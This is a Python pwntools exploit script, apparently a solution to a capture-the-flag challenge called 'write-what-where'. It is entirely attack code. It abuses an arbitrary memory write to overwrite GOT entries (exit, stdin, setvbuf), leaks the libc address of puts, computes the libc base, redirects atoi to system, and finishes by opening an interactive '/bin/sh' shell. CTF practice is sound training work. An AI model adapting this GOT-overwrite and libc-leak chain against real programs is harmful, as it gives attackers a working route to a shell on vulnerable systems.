from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x000000000040122a
continue
'''.format(**locals())

exe = './challenge/write-what-where'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

p = start()

def _write(addr: int, val: int):
    p.sendafter(b'?', p32(val))
    p.sendafter(b'?', str(addr).encode())
    sleep(.1)

# write: exit -> main + 33 (to skip init)
warn("write elf.got.exit -> elf.sym.main+33")
_write(addr=elf.got.exit, val=elf.sym.main + 33)

# write: sdtin -> elf.got.puts
warn(f"write elf.sym.sdtin {hex(elf.sym.stdin)} -> elf.got.puts ({hex(elf.got.puts)})")
_write(addr=elf.sym.stdin, val=elf.got.puts)
_write(addr=elf.sym.stdin + 4, val=0)

# write: elf.got.setvbuf -> elf.plt.puts
warn(f"write elf.got.setvbuf {hex(elf.got.setvbuf)} -> elf.plt.puts")
_write(addr=elf.got.setvbuf, val=elf.plt.puts)
_write(addr=elf.got.setvbuf + 4, val=0)

# write: elf.got.exit -> elf.sym_start
_write(addr=elf.got.exit, val=elf.entrypoint); p.recvline()


leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts

# write: elf.got.atoi -> libc.sym.system
_write(addr=elf.got.atoi, val=libc.sym.system & 0xffffffff)

p.sendafter(b'?', b'aaaa')
p.sendafter(b'?', b'/bin/sh\x00')
p.interactive()
